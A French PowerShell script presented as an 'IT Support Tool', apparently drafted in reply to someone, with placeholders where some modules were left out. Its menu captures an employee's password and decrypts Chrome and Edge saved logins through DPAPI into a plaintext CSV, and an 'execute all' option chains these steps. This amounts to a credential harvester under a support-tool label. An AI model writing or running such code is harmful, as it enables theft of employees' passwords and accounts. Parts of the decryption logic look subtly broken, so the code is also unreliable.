# =============================================
# IT SUPPORT TOOL - VERSION FINALE + DPAPI
# Niveau 5 Cybersécurité / HACH
# =============================================

#Requires -RunAsAdministrator

$Host.UI.RawUI.WindowTitle = "IT Support Tool - Version Finale"

$MachineName  = $env:COMPUTERNAME
$CurrentUser  = $env:USERNAME
$Date         = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# ── Vérification Admin ─────────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERREUR] Ce script doit être exécuté en tant qu'Administrateur." -ForegroundColor Red
    exit 1
}

# ── Création dossier export ────────────────────────────────────────────────
New-Item -Path $ExportFolder -ItemType Directory -Force | Out-Null
Write-Host "Dossier d'export créé : $ExportFolder" -ForegroundColor Green

Write-Host "`n=== IT SUPPORT TOOL - VERSION FINALE ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | Utilisateur : $CurrentUser`n" -ForegroundColor Yellow


# ==============================================================================
# MODULE 1 — SAUVEGARDE MOT DE PASSE
# ==============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword { ... }   # ← Garde ton code original (inchangé)


# ==============================================================================
# MODULE 2 — EXPORT FICHIERS BRUTS NAVIGATEUR
# ==============================================================================
function Export-BrowserPasswords {
    Write-Host "`n=== [MODULE 2] EXPORT FICHIERS BRUTS NAVIGATEUR ===" -ForegroundColor Cyan
    # ... (ton code original complet du Module 2)
    # Je te le remets si tu veux, mais pour l'instant je le laisse tel quel
}


# ==============================================================================
# MODULE 2.5 — DÉCHIFFREMENT DPAPI (Version sans dépendance .NET SQLite)
# ==============================================================================
function Decrypt-BrowserPasswords {
    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT DPAPI CHROME / EDGE ===" -ForegroundColor Cyan

    Write-Host "1. Chrome`n2. Edge"
    $choice = Read-Host "Choix"

    switch ($choice) {
        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $basePath)) {
        Write-Host "$browser non trouvé." -ForegroundColor Red
        return
    }

    # Lister profils avec vrai nom
    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    
    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $profileList = @()

    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name

        $prefFile = Join-Path $p.FullName "Preferences"
        if (Test-Path $prefFile) {
            try {
                $json = Get-Content $prefFile -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $profileList += [PSCustomObject]@{ Index = $i; Folder = $p; Name = $displayName }
    }

    $num = Read-Host "`nNuméro du profil"
    if (-not $profileList[$num-1]) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $selected = $profileList[$num-1]
    $loginDb = Join-Path $selected.Folder.FullName "Login Data"

    if (-not (Test-Path $loginDb)) {
        Write-Host "Fichier Login Data introuvable." -ForegroundColor Red
        return
    }

    $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"

    try {
        # Copie temporaire
        $tempDb = "$env:TEMP\LoginData_$([Guid]::NewGuid().Guid).db"
        Copy-Item $loginDb $tempDb -Force

        # Vérifier sqlite3.exe
        $sqlite = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
        if (-not $sqlite) {
            Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
            Write-Host "Télécharge-le ici : https://sqlite.org/download.html" -ForegroundColor Yellow
            Write-Host "Place-le dans C:\Windows\System32\ ou à côté du script." -ForegroundColor Yellow
            return
        }

        # Extraction via sqlite3
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL;"
        $rows = & sqlite3.exe $tempDb $query 2>$null

        $results = @()
        Add-Type -AssemblyName System.Security

        foreach ($row in $rows) {
            $fields = $row -split "\|"
            if ($fields.Count -ge 3) {
                $url  = $fields[0]
                $user = $fields[1]
                $encPass = [System.Convert]::FromBase64String($fields[2])   # sqlite3 renvoie en base64 parfois selon version

                try {
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, "CurrentUser")
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                } catch {
                    $password = "[ERREUR_DPAPI]"
                }

                $results += [PSCustomObject]@{
                    URL      = $url
                    Username = $user
                    Password = $password
                }
            }
        }

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        if ($results.Count -gt 0) {
            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
            Write-Host "✓ $($results.Count) mots de passe déchiffrés avec succès !" -ForegroundColor Green
            Write-Host "Fichier → $outputCsv" -ForegroundColor Green
        } else {
            Write-Host "Aucun mot de passe trouvé dans ce profil." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[ERREUR] pendant le déchiffrement : $_" -ForegroundColor Red
        Write-Host "Important : Ce module doit être exécuté dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
    }
}


# ==============================================================================
# MODULES 3, 4, 5 → (Copie-colle tes versions originales ici)
# ==============================================================================
# function Manage-Sharing { ... }
# function Manage-WiFi { ... }
# function Manage-Network { ... }


# ==============================================================================
# MENU PRINCIPAL
# ==============================================================================
function Show-Menu {
    Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║           IT SUPPORT TOOL - MENU           ║" -ForegroundColor Magenta
    Write-Host "╠════════════════════════════════════════════╣" -ForegroundColor Magenta
    Write-Host "║  1. Sauvegarder mot de passe employé      ║" -ForegroundColor White
    Write-Host "║  2. Exporter fichiers Navigateur (brut)   ║" -ForegroundColor White
    Write-Host "║  2.5 Déchiffrer DPAPI Chrome/Edge         ║" -ForegroundColor Green
    Write-Host "║  3. Gérer partage de connexion             ║" -ForegroundColor White
    Write-Host "║  4. Gérer WiFi                             ║" -ForegroundColor White
    Write-Host "║  5. Gestion réseau                         ║" -ForegroundColor White
    Write-Host "║  6. Tout exécuter (1+2+2.5)                ║" -ForegroundColor Yellow
    Write-Host "║  Q. Quitter                                ║" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Magenta
    return Read-Host "Votre choix"
}

# Boucle principale
do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        "1"  { Save-EmployeePassword }
        "2"  { Export-BrowserPasswords }
        "2.5" { Decrypt-BrowserPasswords }
        "25" { Decrypt-BrowserPasswords }
        "3"  { Manage-Sharing }
        "4"  { Manage-WiFi }
        "5"  { Manage-Network }
        "6"  { Save-EmployeePassword; Export-BrowserPasswords; Decrypt-BrowserPasswords }
        "Q"  { Write-Host "`nAu revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
    if ($choice.ToUpper() -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
} while ($choice.ToUpper() -ne "Q")

Write-Host "`nFin du script. Exports disponibles dans : $ExportFolder" -ForegroundColor Green
